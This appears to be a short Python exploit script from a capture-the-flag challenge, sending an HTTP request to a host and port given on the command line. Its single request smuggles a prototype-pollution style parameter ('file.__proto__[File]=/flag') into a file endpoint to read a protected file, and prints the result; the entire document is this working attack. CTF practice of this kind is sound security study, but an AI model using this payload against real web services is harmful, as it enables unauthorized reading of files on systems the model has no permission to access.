import httpx
import sys

target = f"http://{sys.argv[1]}:{sys.argv[2]}/"

res = httpx.get(target + "file?file.__proto__[File]=/flag")
print(res.text)